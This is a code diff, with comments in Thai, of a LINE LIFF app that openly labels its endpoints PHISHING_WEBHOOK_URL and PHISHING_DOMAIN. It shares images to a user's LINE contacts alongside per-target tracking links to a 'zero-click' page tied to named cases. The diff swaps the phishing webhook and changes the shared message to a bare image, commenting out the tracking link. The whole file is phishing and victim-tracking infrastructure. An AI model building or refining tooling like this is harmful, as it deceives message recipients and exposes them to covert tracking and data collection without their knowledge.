@@ -399,7 +399,7 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwRWNIG8NP1ckMGkRrsbIQb_LBzhbkjMGNp3pkKQoDGZdVlAiKXtPIGM6whZSaQPHqvSw/exec'; // ไฟล์ GoogleScript.html
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwPFv3nEtpZtwPjIdt3XAvVQjdSAhsrhl_vxwnAxR9XhSNVIlAHr0x83ShvRJlZEUwQVQ/exec'; // ไฟล์ GoogleScript.html
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -818,76 +818,48 @@
                 
                 // สร้าง URL สำหรับ Zero Click
                 const zeroClickUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
-                
-                // สร้างข้อความแชร์
+
+                // สร้างข้อความแชร์ (ส่งเฉพาะรูปภาพ)
                 const message = {
-                    type: 'flex',
-                    altText: `รูปภาพจากผู้ใช้ ${displayName}`,
-                    contents: {
-                        type: 'bubble',
-                        hero: {
-                            type: 'image',
-                            url: imageUrl,
-                            size: 'full',
-                            aspectRatio: '16:9',
-                            aspectMode: 'cover',
-                            action: {
-                                type: 'uri',
-                                uri: zeroClickUrl
-                            }
-                        },
-                        body: {
-                            type: 'box',
-                            layout: 'vertical',
-                            contents: [
-                                {
-                                    type: 'text',
-                                    text: 'รูปภาพใหม่',
-                                    weight: 'bold',
-                                    size: 'xl'
-                                },
-                                {
-                                    type: 'text',
-                                    text: 'กดที่รูปภาพเพื่อดูเพิ่มเติม',
-                                    size: 'sm',
-                                    color: '#888888',
-                                    margin: 'md'
-                                }
-                            ]
-                        },
-                        footer: {
-                            type: 'box',
-                            layout: 'vertical',
-                            contents: [
-                                {
-                                    type: 'button',
-                                    style: 'primary',
-                                    action: {
-                                        type: 'uri',
-                                        label: 'ดูรูปภาพเพิ่มเติม',
-                                        uri: zeroClickUrl
-                                    }
-                                }
-                            ]
-                        }
-                    }
+                    type: 'image',
+                    originalContentUrl: imageUrl, // URL รูปภาพที่อัพโหลด
+                    previewImageUrl: imageUrl, // URL รูปภาพตัวอย่าง (ใช้เหมือนกันได้)
+                    // เพิ่ม action ให้คลิกที่รูปภาพได้ (ถ้าต้องการ)
+                    // action: {
+                    //     type: 'uri',
+                    //     uri: zeroClickUrl
+                    // }
+                    // หมายเหตุ: การใส่ action ใน image message อาจไม่รองรับในทุกเวอร์ชัน LINE
+                    // การส่งเฉพาะรูปภาพจะทำให้ผู้รับเห็นรูปภาพโดยตรง
                 };
-                
-                // ย้ายการส่ง notification ไปหลังจากแชร์สำเร็จ
-                // sendZeroClickNotification(trackingKey, caseName); // <-- ย้ายบรรทัดนี้
-                
+
+                // Removed: sendZeroClickNotification call was here previously
+
                 if (liff.isApiAvailable('shareTargetPicker')) {
-                    const result = await liff.shareTargetPicker([message]);
+                    // ส่งเฉพาะ Image Message
+                    const result = await liff.shareTargetPicker([
+                        // ส่งข้อความที่เป็นรูปภาพอย่างเดียว
+                        {
+                            type: 'image',
+                            originalContentUrl: imageUrl,
+                            previewImageUrl: imageUrl
+                        },
+                        // เพิ่มข้อความแนะนำ (ถ้าต้องการ) แต่จะทำให้ไม่ใช่แค่รูปภาพอย่างเดียว
+                        // {
+                        //     type: 'text',
+                        //     text: `กดที่นี่เพื่อดู: ${zeroClickUrl}`
+                        // }
+                    ]);
                     
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
-                        
-                        // 1. บันทึก Tracking Key Mapping ก่อนส่ง Notification
-                        await saveTrackingCaseMapping(trackingKey, caseName); 
-                        
-                        // 2. ส่งข้อมูลการเปิดดูแรก (Zero Click) หลังจากแชร์สำเร็จแล้ว
-                        sendZeroClickNotification(trackingKey, caseName); 
-                        
+
+                        // 1. บันทึก Tracking Key Mapping หลังจากแชร์สำเร็จ
+                        await saveTrackingCaseMapping(trackingKey, caseName);
+
+                        // 2. Removed: sendZeroClickNotification(trackingKey, caseName);
+                        // การแจ้งเตือน Zero Click จะถูกจัดการโดย zero-click.html และ GoogleScript.html เมื่อผู้รับเปิดลิงก์
+
                         // 3. รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
